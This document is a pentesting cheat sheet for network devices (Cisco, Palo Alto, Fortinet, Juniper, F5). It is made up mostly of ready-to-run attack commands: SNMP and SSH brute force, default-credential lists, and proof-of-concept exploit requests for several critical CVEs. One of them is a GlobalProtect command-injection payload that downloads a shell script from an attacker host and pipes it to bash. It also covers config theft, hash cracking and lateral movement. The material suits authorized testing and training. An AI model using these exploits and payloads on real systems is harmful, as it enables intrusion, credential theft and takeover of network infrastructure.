# Network Device Pentesting

**Tags:** `#NetworkDevices` `#Cisco` `#PaloAlto` `#Fortinet` `#Juniper` `#SNMP` `#RouterSploit`

---

## Methodology Overview

```
1. Discovery & Fingerprinting
2. Service Enumeration (SNMP, SSH, web management)
3. Default / Weak Credential Testing
4. Known CVE / Exploit Assessment
5. Config Extraction & Analysis
6. Post-Exploitation (credential reuse, lateral movement, pivoting)
```

---

## Common Ports

| Port | Protocol | Service |
|---|---|---|
| 22 | TCP | SSH management |
| 23 | TCP | Telnet (legacy, plaintext) |
| 80/443 | TCP | HTTP/HTTPS web management |
| 161 | UDP | SNMP (read queries) |
| 162 | UDP | SNMP traps |
| 830 | TCP | NETCONF (SSH-based config mgmt) |
| 4786 | TCP | Cisco Smart Install |
| 8443 | TCP | Alternate HTTPS management |
| 4443 | TCP | Palo Alto GlobalProtect |
| 10443 | TCP | Palo Alto GlobalProtect (alt) |

---

## Discovery & Fingerprinting

```bash
# Full port scan + service/version detection on known mgmt ports
nmap -sV -sC -p 22,23,80,443,161,830,4786,8443 10.0.0.0/24

# UDP scan for SNMP
nmap -sU -p 161,162 10.0.0.0/24

# OS + device detection
nmap -O --osscan-guess 10.0.0.0/24

# Nmap NSE scripts for network devices
nmap --script snmp-info -sU -p 161 10.0.0.0/24
nmap --script cisco-* 10.0.0.0/24
nmap --script banner -p 22,23 10.0.0.0/24
```

### Identifying Device Type from Banner

```bash
# SSH banner grab
nc -w 3 10.0.0.1 22

# Telnet banner (look for "User Access Verification", "login:", Cisco/Juniper identifiers)
nc -w 3 10.0.0.1 23

# HTTP title / Server header
curl -sk https://10.0.0.1 | grep -i "<title>"
curl -skI https://10.0.0.1 | grep -i "server:"
```

---

## SNMP Enumeration

SNMP v1/v2c uses community strings (essentially plaintext passwords). **Public** = read, **Private** = read-write.

### Brute Force Community Strings

```bash
# onesixtyone — fast community string bruteforce
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.0.0.1
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -i hosts.txt

# Common community strings to try manually:
# public, private, cisco, community, manager, monitor, snmp, read, write, admin
```

### SNMPwalk — Extract Device Info

```bash
# System info
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.1

# Full walk (verbose)
snmpwalk -v2c -c public 10.0.0.1

# Interfaces
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.2

# Routing table
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.4.21

# Running processes (if supported)
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.25.4

# IOS config via SNMP (Cisco) — if read-write community
snmpset -v2c -c private 10.0.0.1 ...
```

### snmp-check — Formatted output

```bash
snmp-check 10.0.0.1 -c public
snmp-check 10.0.0.1 -c public -v 2c
```

---

## Default Credentials by Vendor

| Vendor / Device | Default Username | Default Password |
|---|---|---|
| Cisco IOS | `cisco` | `cisco` |
| Cisco IOS | `admin` | `admin` |
| Cisco ASA | `pix` | `pix` |
| Cisco Meraki | `admin` | (email-based, no default) |
| Cisco Smart Install | n/a | n/a (unauthenticated) |
| Palo Alto PAN-OS | `admin` | `admin` |
| Fortinet FortiGate | `admin` | `` (empty) |
| Juniper JunOS | `root` | `` (empty) |
| Juniper SRX | `root` | `` (empty) |
| F5 BIG-IP | `admin` | `admin` |
| F5 BIG-IP | `root` | `default` |
| SonicWall | `admin` | `password` |
| pfSense | `admin` | `pfsense` |
| MikroTik | `admin` | `` (empty) |

```bash
# SecLists default credentials
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
```

---

## SSH / Telnet Brute Force

```bash
# Hydra — SSH
hydra -L users.txt -P passwords.txt ssh://10.0.0.1 -t 4

# Single user
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 -t 4

# Telnet
hydra -l admin -P passwords.txt telnet://10.0.0.1

# Medusa — SSH
medusa -h 10.0.0.1 -u admin -P passwords.txt -M ssh
```

> Network devices often have low rate limits and lockout thresholds — use `-t 1` or `-t 2` and consider `-W` delays.

---

## RouterSploit

Framework specifically designed for embedded network devices.

```bash
# Install
pip3 install routersploit
# or
git clone https://github.com/threat9/routersploit
cd routersploit && python3 rsf.py
```

```
# Auto-scan target for all known exploits
use scanners/autopwn
set target 10.0.0.1
run

# Specific vendor scanners
use scanners/routers/cisco_scanner
use scanners/routers/juniper_scanner
use scanners/routers/fortinet_scanner

# Credential brute force modules
use creds/routers/cisco_enable_telnet_default
use creds/ssh/ssh_default

# Exploit specific CVE
use exploits/routers/cisco/...
```

---

## Cisco

### Smart Install Exploitation (CVE-2018-0171 — TCP 4786)

Cisco Smart Install is a legacy zero-touch provisioning protocol. Often left enabled and **unauthenticated**. CVSS 9.8.

```bash
# Check if Smart Install is exposed
nmap -p 4786 10.0.0.1
nmap --script cisco-siet 10.0.0.1

# siet.py — Smart Install Exploitation Tool
git clone https://github.com/Sab0tag3d/SIET
python2 siet.py -i 10.0.0.1 -g     # grab running config
python2 siet.py -i 10.0.0.1 -a     # change TFTP server to attacker
python2 siet.py -i 10.0.0.1 -t     # send TFTP config (replace config)
```

### IOS XE Web UI (CVE-2023-20198 + CVE-2023-20273)

Critical chain: unauthenticated admin account creation → code injection. CVSS 10.0.

```bash
# Check if web UI is exposed
curl -sk https://10.0.0.1/webui/

# PoC: create admin user (CVE-2023-20198)
curl -sk -X POST "https://10.0.0.1/%2Fwebui%2Flogoutconfirm.html%3Flogon_hash%3D1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=hacker&password=Hacker123!"

# Verify
curl -sk -u hacker:Hacker123! https://10.0.0.1/webui/
```

### SNMP RCE (CVE-2017-6736)

Cisco IOS SNMP remote code execution. Requires valid community string.

```bash
# Metasploit
use exploit/cisco/cisco_ios_snmp_rce
set RHOSTS 10.0.0.1
set COMMUNITY public
run
```

### Cisco ASA Path Traversal (CVE-2018-0296)

```bash
curl -sk "https://10.0.0.1/+CSCOU+/../+CSCOE+/files/file-list"
curl -sk "https://10.0.0.1/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"
```

### Extracting & Cracking Cisco Passwords

Cisco IOS config password types:

| Type | Algorithm | Crackable |
|---|---|---|
| `Type 0` | Plaintext | Yes (it's there) |
| `Type 7` | Vigenere cipher (XOR) | Instantly (reversible) |
| `Type 5` | MD5 | hashcat `-m 500` |
| `Type 8` | PBKDF2-SHA256 | hashcat `-m 9200` (slow) |
| `Type 9` | scrypt | hashcat `-m 9300` (very slow) |

```bash
# Type 7 — many online decoders, or:
# https://www.ifm.net.nz/cookbooks/passwordcracker.html

# Type 5 (MD5) — hashcat
hashcat -m 500 cisco_hash.txt /usr/share/wordlists/rockyou.txt

# Type 8 (PBKDF2)
hashcat -m 9200 cisco_hash.txt /usr/share/wordlists/rockyou.txt

# Type 9 (scrypt)
hashcat -m 9300 cisco_hash.txt /usr/share/wordlists/rockyou.txt

# John — auto detect Cisco type
john cisco_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Post-Auth Cisco — Extract Config

```bash
# Via SSH (IOS)
ssh admin@10.0.0.1 "show running-config"
ssh admin@10.0.0.1 "show version"
ssh admin@10.0.0.1 "show ip interface brief"
ssh admin@10.0.0.1 "show ip route"

# TFTP copy (from device CLI)
copy running-config tftp://10.10.14.x/running-config.txt
```

---

## Palo Alto PAN-OS

### GlobalProtect OS Command Injection (CVE-2024-3400)

PAN-OS < 11.1.2-h3 / 11.0.4-h1 / 10.2.9-h1. Unauthenticated RCE via GlobalProtect. CVSS 10.0.

```bash
# Check version
curl -sk "https://10.0.0.1/global-protect/login.esp" | grep -i "version"

# PoC — create shell via cookie injection
curl -sk --request GET "https://10.0.0.1/global-protect/login.esp" \
  -H "Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}10.10.14.x/shell.sh|bash`"

# Metasploit module
use exploit/multi/http/panos_globalprotect_rce_cve_2024_3400
set RHOSTS 10.0.0.1
run
```

### Authentication Bypass — SAML SSO (CVE-2020-2021)

If SAML is enabled and signature verification is disabled:

```bash
# Check if SAML is configured and vulnerable
curl -sk https://10.0.0.1/SAML20/SP/ACS
```

### PAN-OS XML API (Post-Auth)

```bash
# Get API key
curl -sk "https://10.0.0.1/api/?type=keygen&user=admin&password=admin"

# Use API key to extract config
curl -sk "https://10.0.0.1/api/?type=config&action=show&key=<APIKEY>"

# Run CLI command via API
curl -sk "https://10.0.0.1/api/?type=op&cmd=<show><system><info></info></system></show>&key=<APIKEY>"
```

---

## Fortinet FortiGate

### Authentication Bypass (CVE-2022-40684)

FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1. Unauthenticated admin account takeover via REST API. CVSS 9.8.

```bash
# Add SSH key to admin account (unauthenticated)
curl -sk -X PUT "https://10.0.0.1/api/v2/cmdb/system/admin/admin" \
  -H "User-Agent: Report Runner" \
  -H "Forwarded: for=[127.0.0.1];by=localhost" \
  -H "Content-Type: application/json" \
  -d '{"ssh-public-key1": "ssh-rsa AAAA..."}'

# SSH in as admin
ssh -i id_rsa admin@10.0.0.1
```

### SSL-VPN Heap Overflow (CVE-2023-27997)

Pre-auth RCE in SSL-VPN. Affects FortiOS < 7.2.5 / 7.0.12 / 6.4.13.

```bash
# Check SSL-VPN portal
curl -sk "https://10.0.0.1/remote/login"

# Metasploit (if module available)
use exploit/multi/http/fortigate_ssl_vpn_rce
```

### Post-Auth — Extract Config

```bash
# Via SSH
ssh admin@10.0.0.1
> show full-configuration
> get system interface
> get router info routing-table all
> diagnose debug authd fsso list
```

---

## Juniper JunOS

### J-Web RCE Chain (CVE-2023-36845 + CVE-2023-36844)

Pre-auth RCE via PHP file upload in J-Web. CVSS 9.8 chained.

```bash
# Check J-Web
curl -sk https://10.0.0.1/

# PoC — environment variable injection → LFI chain (CVE-2023-36845)
curl -sk "https://10.0.0.1/webauth_operation.php?PHPRC=/dev/fd/0" \
  --data-binary $'auto_prepend_file=/etc/passwd\n'
```

### Default Access + Config Extraction

```bash
# SSH as root (no password by default on some versions)
ssh root@10.0.0.1

# JunOS CLI
> show configuration
> show interfaces
> show route
> show version
```

---

## F5 BIG-IP

### iControl REST Auth Bypass (CVE-2021-22986)

Unauthenticated RCE via iControl REST API. CVSS 9.8.

```bash
curl -sk -X POST "https://10.0.0.1/mgmt/tm/util/bash" \
  -H "Content-Type: application/json" \
  -H "Authorization: Basic YWRtaW46" \
  -d '{"command":"run","utilCmdArgs":"-c id"}'
```

---

## General Post-Exploitation

### What to Look For in Extracted Configs

```
- Enable/privileged exec passwords (crack offline)
- Local user accounts + password hashes
- SNMP community strings (use for further enumeration)
- RADIUS/TACACS+ server IPs and shared secrets
- VPN pre-shared keys / certificates
- BGP/OSPF authentication keys
- AAA server credentials
- Syslog server IPs (internal topology)
- NTP server IPs
- Loopback / management network ranges
- ACLs / firewall rules (map allowed services)
- VLAN assignments
```

### Lateral Movement Opportunities

- **TACACS+/RADIUS shared secrets** → crack and reuse against AAA server
- **VPN PSK** → authenticate as legitimate VPN client
- **Password reuse** → admin creds on network devices often reused on other systems
- **SNMP write access** → modify routing tables or redirect traffic
- **Routing protocol auth keys** → inject routes (BGP/OSPF manipulation)

### Network Topology Intel

```bash
# CDP/LLDP neighbors — reveals connected devices
ssh admin@10.0.0.1 "show cdp neighbors detail"
ssh admin@10.0.0.1 "show lldp neighbors detail"

# ARP table — live hosts on connected segments
ssh admin@10.0.0.1 "show ip arp"

# Routing table — internal network map
ssh admin@10.0.0.1 "show ip route"

# VLANs
ssh admin@10.0.0.1 "show vlan brief"
```

---

## Metasploit Modules

```bash
# Search for relevant modules
search type:exploit cisco
search type:exploit palo
search type:exploit fortinet
search type:auxiliary snmp

# Key modules
use auxiliary/scanner/snmp/snmp_login           # SNMP community brute
use auxiliary/scanner/snmp/snmp_enum            # SNMP enumeration
use auxiliary/scanner/ssh/ssh_login             # SSH brute
use exploit/cisco/cisco_ios_snmp_rce            # Cisco SNMP RCE
use auxiliary/scanner/http/cisco_asa_asdm       # Cisco ASA scanner
```

---

## Notable CVEs Quick Reference

| CVE | Vendor / Product | Type | CVSS |
|---|---|---|---|
| CVE-2023-20198 | Cisco IOS XE Web UI | Priv Esc → code exec | 10.0 |
| CVE-2023-20273 | Cisco IOS XE Web UI | Injection (chain w/ above) | 7.2 |
| CVE-2018-0171 | Cisco Smart Install | Unauth RCE | 9.8 |
| CVE-2018-0296 | Cisco ASA | Path traversal (info disclosure) | 7.5 |
| CVE-2020-3259 | Cisco ASA / FTD | Heap info disclosure | 7.5 |
| CVE-2024-3400 | Palo Alto GlobalProtect | Unauth OS command injection | 10.0 |
| CVE-2020-2021 | Palo Alto PAN-OS | SAML auth bypass | 10.0 |
| CVE-2022-40684 | Fortinet FortiOS | Auth bypass REST API | 9.8 |
| CVE-2023-27997 | Fortinet FortiOS SSL-VPN | Pre-auth heap overflow RCE | 9.8 |
| CVE-2023-36845 | Juniper J-Web | Pre-auth RCE chain | 9.8 |
| CVE-2021-22986 | F5 BIG-IP iControl | Unauth RCE | 9.8 |

---

## Checklist

```
[ ] Nmap — discover devices, identify vendor from banners/ports
[ ] SNMP — brute community strings, enumerate via snmpwalk/snmp-check
[ ] Default credentials — test per-vendor defaults on SSH/web UI
[ ] SSH/Telnet brute force — low thread count to avoid lockout
[ ] RouterSploit autopwn — quick scan for known vulns
[ ] Web management interface — check for exposed UI, known CVEs
[ ] Cisco Smart Install — check TCP 4786
[ ] Relevant CVEs — check version against known critical vulns
[ ] Extract running config — grep for creds, PSKs, secrets
[ ] Crack password hashes from config (Type 5/7/8/9)
[ ] CDP/LLDP neighbors — map connected topology
[ ] ARP/routing tables — discover internal subnets
[ ] TACACS+/RADIUS shared secrets — crack and reuse
[ ] Document all discovered credentials and network segments
```
